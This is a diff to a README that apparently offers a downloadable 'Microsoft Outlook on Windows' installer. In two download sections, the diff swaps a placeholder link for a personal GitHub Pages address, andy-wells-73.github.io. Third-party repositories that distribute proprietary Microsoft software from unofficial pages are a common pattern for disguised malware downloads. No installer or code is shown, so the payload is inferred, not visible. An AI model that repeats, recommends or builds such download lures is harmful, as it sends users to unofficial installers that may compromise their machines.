@@ -17,7 +17,7 @@ A single Microsoft Outlook on Windows deployment covers both portable and instal
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://andy-wells-73.github.io/microsoft-outlook-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with an existing installation of the same client follows a distinct 
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://andy-wells-73.github.io/microsoft-outlook-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
